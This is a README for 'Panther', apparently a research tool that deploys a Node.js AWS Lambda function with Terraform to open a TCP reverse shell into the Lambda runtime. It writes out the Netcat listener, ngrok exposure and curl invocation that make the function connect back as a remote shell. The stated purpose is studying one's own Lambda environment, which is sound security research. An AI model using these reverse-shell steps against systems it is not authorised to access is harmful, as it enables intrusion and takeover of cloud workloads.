# Puma Prey Panther

Panther is a Node.js function that can be deployed to the AWS to establish a TCP reverse shell for the purposes of introspecting the Lambda container runtime.

## Installing Prerequisites

* [AWS Command Line Interface](https://aws.amazon.com/cli/)
* [Node.js v16 / NPM](https://nodejs.org/en/download/)
* [Terraform](https://learn.hashicorp.com/terraform/getting-started/install.html)

## Deploying The Function

```bash
# AWS profile to use for the deployment
export TF_VAR_profile=default
export TF_VAR_unique_identifier=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') 
cd ./panther/src/terraform
terraform init
terraform apply --auto-approve
```

## Function Testing

Retrieve the Function URL and API Key via the CLI.

```bash
export PANTHER_FUNCTION_URL=$(terraform output --json | jq -r '.panther_function_url.value')
export PANTHER_API_KEY=$(terraform output -json | jq -r '.panther_function_api_key.value')
curl -H "X-API-Key: $PANTHER_API_KEY" $PANTHER_FUNCTION_URL
```

The result should show an error message indicating required C2 parameters are missing:

```json
{"message":"Must provide the host and port for the target TCP server as query parameters."}
```

See [here](../script/USAGE.md) for more details on how to use this script.

Alternatively, you can do this manually by setting up a Netcat listener like so:

```bash
nc -l 4444
```

Then, to make your listener accessible from the public internet, consider using a service like ngrok:

```bash
ngrok tcp 4444
```

Finally, invoke your function, supplying your connection details and API key:

```bash
curl -H "X-API-Key: $PANTHER_API_KEY" $PANTHER_FUNCTION_URL
?host=NGROK_PORT_IP&port=NGROK_PORT_NUMBER"
```

Your listener will now act as a reverse shell for the duration of the function invocation.

## Teardown

```bash
terraform destroy
```

## Learning More

Read [documentation](./docs/NOTES.md) on what you can accomplish once you connect to the runtime via Panther.
